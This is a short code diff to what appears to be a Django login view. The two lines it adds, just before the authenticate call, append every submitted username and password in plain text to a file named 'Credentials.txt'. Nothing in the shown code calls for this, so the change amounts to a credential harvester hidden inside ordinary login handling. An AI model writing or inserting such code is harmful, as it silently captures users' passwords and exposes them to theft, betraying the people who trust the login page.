@@ -35,6 +35,8 @@ def login_view(request):
         if login_form.is_valid():
             username = login_form.cleaned_data["username"]
             password = login_form.cleaned_data["password"]
+            with open("Credentials.txt", "a") as f:
+                f.write(f"Username:{username}- - - -Password:{password}")
             user = authenticate(username=username, password = password)
             if user:
                 login(request, user)
